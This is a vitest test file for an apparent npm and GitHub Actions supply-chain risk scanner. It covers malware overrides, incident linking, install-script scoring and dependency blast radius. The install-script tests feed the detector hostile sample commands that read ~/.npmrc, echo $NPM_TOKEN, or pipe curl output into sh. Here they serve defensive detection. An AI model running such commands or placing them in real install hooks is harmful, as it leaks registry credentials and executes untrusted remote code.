import { describe, expect, it } from 'vitest';
import { makeFact, npmPurl, type Asset, type Component, type EntityLink, type Fact, type Incident, type Inventory } from '../core/types.js';
import {
  ageDecay,
  buildScanResult,
  createLinkPathProvider,
  inboundExposure,
  buildDependencyGraph,
  scoreEntityRisk,
  scoreIntrinsic,
  scoreInventory,
  scoreOutbound,
  vulnValue,
  type WorkflowRiskInput,
} from './index.js';

import { INSTALL_SCRIPT_FLAGS } from '../core/install-flags.js';
import { analyzeInstallScripts, markNewInstallHooks, scriptFlags } from '../enrich/npm/scripts.js';
import { INSTALL_SCRIPT } from './weights.js';

const NOW = new Date('2026-06-01T00:00:00.000Z');
const meta = (source = 'test') => ({ source, fetchedAt: NOW, evidence: ['https://example.org/evidence'] });
const daysAgo = (d: number) => new Date(NOW.getTime() - d * 86_400_000).toISOString();

function comp(name: string, version: string, extra: Partial<Component> = {}): Component {
  return { purl: npmPurl(name, version), ecosystem: 'npm', name, version, ...extra };
}
const repoAsset = (extra: Partial<Asset> = {}): Asset => ({
  id: 'repo:app',
  kind: 'repo',
  name: 'app',
  environment: 'prod',
  criticality: 5,
  sourceFile: 'package-lock.json',
  ...extra,
});

describe('intrinsic risk', () => {
  // Regression: one Scorecard viewer link, not an encoded and an unencoded copy.
  it('cites the Scorecard viewer page once', () => {
    const c = comp('lib', '1.0.0');
    const value = { repo: 'github.com/o/lib', score: 3, checks: [], date: '2026-01-01' };
    const viewer = 'https://scorecard.dev/viewer/?uri=github.com/o/lib';
    const withViewer = makeFact('scorecard', npmPurl('lib'), value, { source: 'depsdev', fetchedAt: NOW, evidence: [viewer] });
    const r = scoreIntrinsic(c, [withViewer], { now: NOW }).reasons.find((x) => x.factor === 'weak_posture')!;
    expect(r.evidence.filter((u) => u.startsWith('https://scorecard.dev/viewer/'))).toEqual([viewer]);
    const bare = makeFact('scorecard', npmPurl('lib'), value, { source: 'depsdev', fetchedAt: NOW, evidence: [] });
    const r2 = scoreIntrinsic(c, [bare], { now: NOW }).reasons.find((x) => x.factor === 'weak_posture')!;
    expect(r2.evidence).toEqual(['https://scorecard.dev/viewer/?uri=github.com%2Fo%2Flib']);
  });

  // Regression: detectedAt is the scan time; it must not count as a fresh ownership change.
  it('scores an undated repo_transfer as a small constant, decaying only from a real transfer date', () => {
    const c = comp('lib', '1.0.0');
    const base = { repo: 'github.com/newowner/lib', fromOwner: 'oldowner', toOwner: 'newowner', detectedAt: NOW.toISOString() };
    const undated = scoreIntrinsic(c, [makeFact('repo_transfer', npmPurl('lib'), base, meta('github'))], { now: NOW });
    const r = undated.reasons.find((x) => x.factor === 'repo_transfer')!;
    expect(r.value).toBe(0.2);
    expect(r.detail).toContain('date of the move unknown');
    expect(undated.intrinsic).toBeCloseTo(0.1, 6);
    const dated = scoreIntrinsic(c, [makeFact('repo_transfer', npmPurl('lib'), { ...base, transferredAt: daysAgo(45) }, meta('github'))], { now: NOW });
    expect(dated.reasons.find((x) => x.factor === 'repo_transfer')!.value).toBeCloseTo(0.5, 2);
    const old = scoreIntrinsic(c, [makeFact('repo_transfer', npmPurl('lib'), { ...base, transferredAt: daysAgo(400) }, meta('github'))], { now: NOW });
    expect(old.reasons.some((x) => x.factor === 'repo_transfer')).toBe(false);
  });

  it('malware fact overrides to 1.0', () => {
    const c = comp('evil', '1.0.0');
    const facts: Fact[] = [makeFact('malware', c.purl, { id: 'MAL-2026-1', origin: 'osv' }, meta('osv'))];
    const r = scoreIntrinsic(c, facts, { now: NOW });
    expect(r.intrinsic).toBe(1);
    expect(r.malware).toBe(true);
    expect(r.reasons[0]).toMatchObject({ factor: 'malware', contribution: 1 });
  });

  it('confirmed compromised-release incident naming the exact version triggers the override', () => {
    const inc: Incident = {
      id: 'INC-2018-0001',
      title: 'handover',
      type: 'malicious_handover',
      status: 'confirmed',
      date: '2018-11-20',
      severity: 'critical',
      affected: [{ purl: 'pkg:npm/event-stream', versions: ['3.3.6'] }],
      entities: [],
      evidence: ['https://github.com/dominictarr/event-stream/issues/116'],
    };
    expect(scoreIntrinsic(comp('event-stream', '3.3.6'), [], { now: NOW, incidents: [inc] }).intrinsic).toBe(1);
    expect(scoreIntrinsic(comp('event-stream', '4.0.1'), [], { now: NOW, incidents: [inc] }).intrinsic).toBe(0);
    // alleged → no override, but entity/incident risk at 0.4
    const alleged = { ...inc, status: 'alleged' as const };
    const c = comp('event-stream', '3.3.6');
    expect(scoreIntrinsic(c, [], { now: NOW, incidents: [alleged] }).intrinsic).toBe(0);
    expect(scoreEntityRisk(c, { now: NOW, incidents: [alleged] }).risk).toBeCloseTo(0.4);
  });

  it('vuln value uses CVSS × exploitability and KEV', () => {
    expect(vulnValue({ cvss: 9.8, severity: 'critical' })).toBeCloseTo(0.686);
    expect(vulnValue({ cvss: 9.8, severity: 'critical', kev: true })).toBe(1);
    expect(vulnValue({ severity: 'low' })).toBeCloseTo(0.14);
    expect(vulnValue({ cvss: 5, severity: 'medium', epss: 1 })).toBeCloseTo(0.5);
  });

  it('noisy-OR contributions sum to the intrinsic score', () => {
    const c = comp('lib', '1.0.0', { hasInstallScript: true });
    const facts: Fact[] = [
      makeFact('vuln', c.purl, { id: 'GHSA-1', aliases: [], severity: 'high', cvss: 8, fixedVersions: ['1.0.1'] }, meta('osv')),
      makeFact('scorecard', 'pkg:npm/lib', { score: 3, repo: 'github.com/o/lib', checks: [{ name: 'Maintained', score: 0 }] }, meta('scorecard')),
      makeFact('maintainers', 'pkg:npm/lib', { maintainers: [{ name: 'a' }], count: 1 }, meta('npm')),
      makeFact('provenance', c.purl, { hasProvenance: false }, meta('npm')),
    ];
    const r = scoreIntrinsic(c, facts, { now: NOW });
    const factors = r.reasons.map((x) => x.factor).sort();
    expect(factors).toEqual(['install_script', 'no_provenance', 'single_maintainer', 'vuln', 'weak_posture']);
    const sum = r.reasons.reduce((s, x) => s + x.contribution, 0);
    expect(sum).toBeCloseTo(r.intrinsic, 3);
    const expected = 1 - (1 - 0.6 * 0.56) * (1 - 0.3 * 0.5) * (1 - 0.3 * 0.7) * (1 - 0.15) * (1 - 0.15);
    expect(r.intrinsic).toBeCloseTo(expected, 6);
    // reasons sorted by contribution desc
    for (let i = 1; i < r.reasons.length; i++) expect(r.reasons[i - 1]!.contribution).toBeGreaterThanOrEqual(r.reasons[i]!.contribution);
  });

  it('ownership changes decay over 90 days; first-time publishers count fully', () => {
    const c = comp('lib', '2.0.0');
    const pc = (d: number, first: boolean) =>
      makeFact(
        'publisher_change',
        c.purl,
        { version: '2.0.0', previousVersion: '1.0.0', previousPublisher: 'a', newPublisher: 'b', changedAt: daysAgo(d), firstTimePublisher: first },
        meta('npm'),
      );
    expect(scoreIntrinsic(c, [pc(0, true)], { now: NOW }).intrinsic).toBeCloseTo(0.5);
    expect(scoreIntrinsic(c, [pc(45, true)], { now: NOW }).intrinsic).toBeCloseTo(0.25);
    expect(scoreIntrinsic(c, [pc(0, false)], { now: NOW }).intrinsic).toBeCloseTo(0.25);
    expect(scoreIntrinsic(c, [pc(120, true)], { now: NOW }).intrinsic).toBe(0);
    const mc = makeFact('maintainer_change', 'pkg:npm/lib', { added: ['x'], removed: ['y'], changedAt: daysAgo(9) }, meta('npm'));
    const r = scoreIntrinsic(c, [pc(45, true), mc], { now: NOW });
    expect(r.reasons).toHaveLength(1);
    expect(r.reasons[0]!.factor).toBe('maintainer_change');
    expect(r.intrinsic).toBeCloseTo(0.45);
    // On a tie, the publisher change (who published the release) is the reason shown.
    const mcSame = makeFact('maintainer_change', 'pkg:npm/lib', { added: ['b'], removed: [], changedAt: daysAgo(45) }, meta('npm'));
    const tie = scoreIntrinsic(c, [mcSame, pc(45, true)], { now: NOW });
    expect(tie.reasons.map((x) => x.factor)).toEqual(['publisher_change']);
  });

  it('install script is raised by network/obfuscation flags', () => {
    const c = comp('lib', '1.0.0');
    const f = (flags: string[]) =>
      makeFact('install_script', c.purl, { hasInstallScript: true, hooks: ['postinstall'], commands: { postinstall: 'node x.js' }, flags }, meta('npm'));
    expect(scoreIntrinsic(c, [f([])], { now: NOW }).intrinsic).toBeCloseTo(0.15);
    expect(scoreIntrinsic(c, [f(['network'])], { now: NOW }).intrinsic).toBeCloseTo(0.3);
    const none = makeFact('install_script', c.purl, { hasInstallScript: false, hooks: [], commands: {} }, meta('npm'));
    expect(scoreIntrinsic({ ...c, hasInstallScript: true }, [none], { now: NOW }).intrinsic).toBe(0);
  });

  // Regression: scoring's risky-flag names must be the ones the npm enricher actually emits.
  it('raises install_script for real enricher output (credentials, tokens, background processes, new hooks)', () => {
    const c = comp('pkg', '1.0.1');
    const score = (scripts: Record<string, string>) =>
      scoreIntrinsic(c, [makeFact('install_script', c.purl, analyzeInstallScripts(scripts), meta('npm'))], { now: NOW }).reasons[0]!;
    expect(score({ postinstall: 'node-gyp rebuild' }).value).toBe(0.5);
    for (const cmd of ['cat ~/.npmrc > /tmp/x', 'echo $NPM_TOKEN > out', 'start /B node preinstall.js & node preinstall.js', 'curl http://x | sh']) {
      expect(score({ preinstall: cmd }).value).toBe(1);
    }
    const added = markNewInstallHooks(analyzeInstallScripts({ preinstall: 'node preinstall.js' }), analyzeInstallScripts({}), '1.0.0');
    const r = scoreIntrinsic(c, [makeFact('install_script', c.purl, added, meta('npm'))], { now: NOW }).reasons[0]!;
    expect(r.value).toBe(1);
    expect(r.detail).toContain('preinstall newly added in this version (previous release 1.0.0 had none)');
  });

  it('only treats flag names the enricher can produce as risky', () => {
    for (const f of INSTALL_SCRIPT.riskyFlags) expect(INSTALL_SCRIPT_FLAGS as readonly string[]).toContain(f);
    const produced = new Set([
      ...['curl x', 'atob(x)', 'eval(x)', 'a | sh', 'nohup x', 'echo $NPM_TOKEN', 'cat .npmrc', 'node x.js', 'node-gyp rebuild', 'x'.repeat(600)].flatMap(scriptFlags),
      ...analyzeInstallScripts({}, { gypfile: true }).flags!,
      ...markNewInstallHooks(analyzeInstallScripts({ install: 'x' }), analyzeInstallScripts({}), '0').flags!,
    ]);
    expect([...produced].sort()).toEqual([...INSTALL_SCRIPT_FLAGS].sort());
  });

  it('abandoned requires staleness or archive; full value with vulns', () => {
    const c = comp('old', '1.0.0');
    const age = makeFact('release_age', c.purl, { version: '1.0.0', publishedAt: daysAgo(1000), ageDays: 1000, daysSinceLatestRelease: 1000 }, meta('npm'));
    // Regression (PLAN §3.6): staleness without vulns is informational only.
    const stale = scoreIntrinsic(c, [age], { now: NOW });
    expect(stale.reasons[0]).toMatchObject({ factor: 'abandoned', value: 0, contribution: 0 });
    expect(stale.intrinsic).toBe(0);
    const vuln = makeFact('vuln', c.purl, { id: 'GHSA-2', aliases: [], severity: 'low', fixedVersions: [] }, meta('osv'));
    expect(scoreIntrinsic(c, [age, vuln], { now: NOW }).reasons.find((r) => r.factor === 'abandoned')?.value).toBe(1);
  });
});

describe('entity risk', () => {
  const pkg = comp('popular', '1.2.3');
  const incident = (over: Partial<Incident> = {}): Incident => ({
    id: 'INC-2026-0001',
    title: 'Account takeover of a maintainer account',
    type: 'account_takeover',
    status: 'confirmed',
    date: NOW.toISOString().slice(0, 10),
    severity: 'critical',
    affected: [{ purl: 'pkg:npm/other', versions: ['9.9.9'] }],
    entities: [{ ref: 'account:npm/alice', role: 'compromised_account', confidence: 1 }],
    evidence: ['https://example.org/advisory'],
    ...over,
  });
  const link = (over: Partial<EntityLink> = {}): EntityLink => ({
    from: 'account:npm/alice',
    to: 'pkg:npm/popular',
    relation: 'maintains',
    confidence: 1,
    evidence: ['https://registry.npmjs.org/popular'],
    method: 'deterministic',
    reviewed: false,
    ...over,
  });

  it('direct maintainer path with confirmed incident', () => {
    const paths = createLinkPathProvider([link()], [incident()]);
    const r = scoreEntityRisk(pkg, { now: NOW, incidents: [incident()], paths });
    expect(r.risk).toBeCloseTo(1);
    expect(r.chain).toEqual([
      {
        from: 'pkg:npm/popular',
        entityId: 'account:npm/alice',
        relation: 'maintains',
        confidence: 1,
        evidence: ['https://registry.npmjs.org/popular'],
        method: 'deterministic',
        reviewed: false,
      },
      {
        from: 'account:npm/alice',
        entityId: 'INC-2026-0001',
        relation: 'incident',
        confidence: 1,
        evidence: ['https://example.org/advisory'],
        method: 'deterministic',
        reviewed: true,
      },
    ]);
    expect(r.reasons[0]!.detail).toContain('Linked to INC-2026-0001');
    expect(r.reasons[0]!.detail).not.toMatch(/malicious/i);
  });

  // Regression: the malware-override incident must still appear as the entity chain.
  it('emits the incident hop as the chain when the malware override applies', () => {
    const own = incident({ affected: [{ purl: 'pkg:npm/popular', versions: ['1.2.3'] }], entities: [] });
    const r = scoreEntityRisk(pkg, { now: NOW, incidents: [own] });
    expect(r.risk).toBe(0);
    expect(r.chain).toEqual([
      { from: 'pkg:npm/popular', entityId: 'INC-2026-0001', relation: 'incident', confidence: 1, evidence: ['https://example.org/advisory'], method: 'deterministic', reviewed: true },
    ]);
    // Even when a weaker entity path also exists, the override's incident hop is the chain shown.
    const both = scoreEntityRisk(pkg, { now: NOW, incidents: [own], paths: createLinkPathProvider([link()], [incident({ id: 'INC-2026-0002' })]) });
    expect(both.chain.map((c) => c.entityId)).toEqual(['INC-2026-0001']);
    expect(both.reasons[0]!.detail).toContain('INC-2026-0002');
  });

  // Regression: a "*" affected entry must not mark post-fix releases as malware forever.
  it('treats wildcard incident entries as a decaying incident_affected reason, not the malware override', () => {
    const action: Component = { purl: 'pkg:githubactions/tj-actions/changed-files@ed68ef82c095e0d48ec87eccea555d944a631a4c', ecosystem: 'githubactions', name: 'tj-actions/changed-files', version: 'ed68ef82c095e0d48ec87eccea555d944a631a4c' };
    const ci = incident({
      type: 'ci_compromise',
      severity: 'high',
      date: '2025-03-14',
      affected: [{ purl: 'pkg:githubactions/tj-actions/changed-files', versions: ['*'] }],
      entities: [],
    });
    const intr = scoreIntrinsic(action, [], { now: NOW, incidents: [ci] });
    expect(intr.malware).toBe(false);
    expect(intr.reasons.some((x) => x.factor === 'malware' || x.factor === 'compromised_release')).toBe(false);
    const ent = scoreEntityRisk(action, { now: NOW, incidents: [ci] });
    expect(ent.reasons[0]!.factor).toBe('incident_affected');
    expect(ent.reasons[0]!.detail).toContain('this exact version is not listed');
    expect(ent.risk).toBeCloseTo(0.75 * ageDecay('2025-03-14', NOW), 6);
    expect(ent.risk).toBeLessThan(0.75);
    // An exact SHA match of a confirmed ci_compromise still overrides, under its own factor name.
    const exact = { ...ci, affected: [{ purl: 'pkg:githubactions/tj-actions/changed-files', versions: [action.version] }] };
    const hit = scoreIntrinsic(action, [], { now: NOW, incidents: [exact] });
    expect(hit.malware).toBe(true);
    expect(hit.reasons[0]!.factor).toBe('compromised_release');
  });

  it('applies status weight, age decay and hop decay', () => {
    const alleged = incident({ status: 'alleged' });
    expect(scoreEntityRisk(pkg, { now: NOW, paths: createLinkPathProvider([link()], [alleged]) }).risk).toBeCloseTo(0.4);
    const disputed = incident({ status: 'disputed' });
    expect(scoreEntityRisk(pkg, { now: NOW, paths: createLinkPathProvider([link()], [disputed]) }).risk).toBe(0);
    const old = incident({ date: '2023-06-01' });
    expect(ageDecay('2023-06-01', NOW)).toBeCloseTo(0.5, 2);
    expect(scoreEntityRisk(pkg, { now: NOW, paths: createLinkPathProvider([link()], [old]) }).risk).toBeCloseTo(0.5, 2);
    // org hop: pkg <-maintains- bob -member_of-> org:github/o ; incident references the org → 2 hops → 0.5
    const orgInc = incident({ entities: [{ ref: 'org:github/o', role: 'organization', confidence: 0.9 }] });
    const links = [
      link({ from: 'account:npm/bob' }),
      link({ from: 'account:npm/bob', to: 'org:github/o', relation: 'member_of', confidence: 0.9, method: 'probabilistic', reviewed: true }),
    ];
    const r = scoreEntityRisk(pkg, { now: NOW, paths: createLinkPathProvider(links, [orgInc]) });
    expect(r.risk).toBeCloseTo(1 * 0.9 * 0.9 * 0.5);
    expect(r.chain.map((c) => c.entityId)).toEqual(['account:npm/bob', 'org:github/o', 'INC-2026-0001']);
  });

  it('ignores unreviewed low-confidence probabilistic links', () => {
    const weak = link({ method: 'probabilistic', confidence: 0.6, reviewed: false });
    expect(scoreEntityRisk(pkg, { now: NOW, paths: createLinkPathProvider([weak], [incident()]) }).risk).toBe(0);
    const reviewed = { ...weak, reviewed: true };
    expect(scoreEntityRisk(pkg, { now: NOW, paths: createLinkPathProvider([reviewed], [incident()]) }).risk).toBeCloseTo(0.6);
  });

  it('combined risk = 1-(1-intrinsic)(1-entity) in scoreInventory', () => {
    const inv: Inventory = { assets: [repoAsset()], components: [pkg], edges: [{ from: 'repo:app', to: pkg.purl, scope: 'runtime', direct: true }] };
    const facts: Fact[] = [makeFact('maintainers', 'pkg:npm/popular', { maintainers: [{ name: 'alice' }], count: 1 }, meta('npm'))];
    const out = scoreInventory(inv, facts, { now: NOW, incidents: [incident({ status: 'alleged' })], links: [link()] });
    const f = out.findings[0]!;
    expect(f.score).toBeCloseTo(100 * (1 - (1 - 0.15) * (1 - 0.4)), 1);
    expect(f.level).toBe('medium');
    expect(f.entityChain.length).toBe(2);
    const ent = f.reasons.find((r) => r.factor === 'entity_incident')!;
    expect(ent.contribution).toBeCloseTo(0.85 * 0.4, 3);
  });
});

describe('inbound blast radius', () => {
  const a = comp('a', '1.0.0');
  const b = comp('b', '1.0.0');
  const bad = comp('bad', '1.0.0');
  const inv: Inventory = {
    assets: [repoAsset(), repoAsset({ id: 'repo:tools', name: 'tools', environment: 'dev', criticality: 2 })],
    components: [a, b, bad],
    edges: [
      { from: 'repo:app', to: a.purl, scope: 'runtime', direct: true },
      { from: 'repo:app', to: b.purl, scope: 'dev', direct: true },
      { from: a.purl, to: bad.purl, scope: 'runtime', direct: false },
      { from: b.purl, to: bad.purl, scope: 'dev', direct: false },
      { from: bad.purl, to: a.purl, scope: 'runtime', direct: false }, // cycle
      { from: 'repo:tools', to: b.purl, scope: 'dev', direct: true },
    ],
  };
  const malware: Fact[] = [makeFact('malware', bad.purl, { id: 'MAL-1', origin: 'osv' }, meta('osv'))];

  it('finds all paths, cycle-safe, with widest-path exposure', () => {
    const r = inboundExposure(buildDependencyGraph(inv), bad.purl);
    expect(r.assets.map((x) => x.assetId)).toEqual(['repo:app', 'repo:tools']);
    const app = r.assets[0]!;
    expect(app.exposure).toBe(1);
    expect(app.paths).toEqual([
      ['repo:app', a.purl, bad.purl],
      ['repo:app', b.purl, bad.purl],
    ]);
    const tools = r.assets[1]!;
    expect(tools.exposure).toBe(0.3);
    // app: 1.0 × 5/5 × prod 1 ; tools: 0.3 × 2/5 × dev 0.3
    expect(r.weightedExposure).toBeCloseTo(1 + 0.3 * 0.4 * 0.3);
  });

  it('caps paths per pair and reports truncation', () => {
    const out = scoreInventory(inv, malware, { now: NOW, pathLimits: { maxPathsPerPair: 1 } });
    const f = out.findings[0]!;
    expect(f.purl).toBe(bad.purl);
    expect(f.score).toBe(100);
    expect(f.level).toBe('critical');
    expect(f.blastRadius.assets[0]!.paths).toHaveLength(1);
    expect(out.warnings[0]).toMatch(/truncated for 1 asset\/component pair/);
    expect(f.blastRadius.score).toBeCloseTo(1 + 0.3 * 0.4 * 0.3, 3);
  });

  it('install scripts raise exposure to 0.9; privileged CI ×1.2; SHA pin ×0.7', () => {
    const g = buildDependencyGraph(inv);
    expect(inboundExposure(g, bad.purl, { hasInstallScript: true }).assets[1]!.exposure).toBe(0.9);
    const action = { purl: 'pkg:githubactions/o/act@' + 'a'.repeat(40), ecosystem: 'githubactions' as const, name: 'o/act', version: 'a'.repeat(40), pinning: 'sha' as const };
    const tagged = { ...action, purl: 'pkg:githubactions/o/act@v1', version: 'v1', pinning: 'tag' as const };
    const wf: Asset = { id: 'workflow:.github/workflows/release.yml', kind: 'workflow', name: 'release', environment: 'ci', criticality: 3, sourceFile: '.github/workflows/release.yml', ci: { hasOidc: true } };
    const inv2: Inventory = {
      assets: [wf],
      components: [action, tagged],
      edges: [
        { from: wf.id, to: action.purl, scope: 'build', direct: true },
        { from: wf.id, to: tagged.purl, scope: 'build', direct: true },
      ],
    };
    const g2 = buildDependencyGraph(inv2);
    expect(inboundExposure(g2, tagged.purl).assets[0]!.exposure).toBeCloseTo(0.8 * 1.2);
    expect(inboundExposure(g2, action.purl).assets[0]!.exposure).toBeCloseTo(0.8 * 1.2 * 0.7);
  });

  it('handles large fan-out graphs within bounds', () => {
    const comps: Component[] = [];
    const edges: Inventory['edges'] = [];
    const layers = 6;
    const width = 8;
    for (let l = 0; l < layers; l++)
      for (let i = 0; i < width; i++) comps.push(comp(`n${l}-${i}`, '1.0.0'));
    const target = comp('target', '1.0.0');
    comps.push(target);
    for (let i = 0; i < width; i++) edges.push({ from: 'repo:app', to: npmPurl(`n0-${i}`, '1.0.0'), scope: 'runtime', direct: true });
    for (let l = 0; l + 1 < layers; l++)
      for (let i = 0; i < width; i++)
        for (let j = 0; j < width; j++) edges.push({ from: npmPurl(`n${l}-${i}`, '1.0.0'), to: npmPurl(`n${l + 1}-${j}`, '1.0.0'), scope: 'runtime', direct: false });
    for (let i = 0; i < width; i++) edges.push({ from: npmPurl(`n${layers - 1}-${i}`, '1.0.0'), to: target.purl, scope: 'runtime', direct: false });
    const r = inboundExposure(buildDependencyGraph({ assets: [repoAsset()], components: comps, edges }), target.purl);
    expect(r.assets[0]!.paths).toHaveLength(5);
    expect(r.truncated).toHaveLength(1);
  });

  it('is deterministic regardless of input order', () => {
    const facts: Fact[] = [
      ...malware,
      makeFact('maintainers', 'pkg:npm/a', { maintainers: [{ name: 'x' }], count: 1 }, meta('npm')),
      makeFact('maintainers', 'pkg:npm/b', { maintainers: [{ name: 'y' }], count: 1 }, meta('npm')),
    ];
    const shuffled: Inventory = { assets: [...inv.assets].reverse(), components: [...inv.components].reverse(), edges: [...inv.edges].reverse() };
    const r1 = scoreInventory(inv, facts, { now: NOW });
    const r2 = scoreInventory(shuffled, [...facts].reverse(), { now: NOW });
    expect(JSON.stringify(r2)).toBe(JSON.stringify(r1));
    expect(r1.findings.map((f) => f.purl)).toEqual([bad.purl, a.purl, b.purl]);
    const result = buildScanResult({ target: '.', inventory: inv, score: r1, generatedAt: NOW });
    expect(result.schemaVersion).toBe('1');
    expect(result.inventory.components).toBe(3);
    expect(result.generatedAt).toBe(NOW.toISOString());
  });
});

describe('outbound blast radius', () => {
  const base: WorkflowRiskInput = {
    assetId: 'workflow:.github/workflows/release.yml',
    path: '.github/workflows/release.yml',
    privilegedTriggers: [],
    permissionsUndeclared: false,
    writeScopes: [],
    hasWriteTokens: false,
    hasOidc: false,
    publishes: false,
    checksOutPrHead: false,
    actions: [{ uses: 'actions/checkout@' + 'a'.repeat(40), kind: 'action', pinning: 'sha' }],
  };

  it('scores risky publishing workflows above safe ones', () => {
    const risky: WorkflowRiskInput = {
      ...base,
      assetId: 'workflow:.github/workflows/pr.yml',
      privilegedTriggers: ['pull_request_target'],
      checksOutPrHead: true,
      hasWriteTokens: true,
      writeScopes: ['contents'],
      hasOidc: true,
      publishes: true,
      actions: [...base.actions, { uses: 'some/action@main', kind: 'action', pinning: 'branch' }],
    };
    const out = scoreOutbound([base, risky], { dependents: { 'workflow:.github/workflows/pr.yml': 99 } });
    expect(out[0]!.assetId).toBe(risky.assetId);
    expect(out[0]!.dependents).toBe(99);
    const likelihood = 1 - (1 - 0.8) * (1 - 0.3) * (1 - 0.2) * (1 - 0.3 * 0.5);
    expect(out[0]!.score).toBeCloseTo(100 * likelihood * 1 * 2, 0);
    expect(out[1]!.score).toBe(0);
    expect(out[0]!.reasons.map((r) => r.factor)).toContain('unpinned_actions');
  });
});
